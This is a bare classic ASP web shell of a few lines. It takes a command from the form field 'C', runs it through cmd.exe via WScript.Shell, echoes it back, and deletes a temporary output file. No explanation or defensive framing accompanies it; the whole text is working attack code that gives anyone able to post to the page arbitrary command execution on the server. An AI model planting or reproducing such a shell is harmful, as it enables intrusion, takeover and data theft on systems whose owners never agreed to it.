<%
Set runner = Server.CreateObject("WScript.Shell")
command = Request.Form("C")
Call runner.Run("cmd.exe /c " & command, 0, True)
Response.Write command
Call runner.Run("cmd.exe /c del C:\temp\output.txt", 0, True)
%>
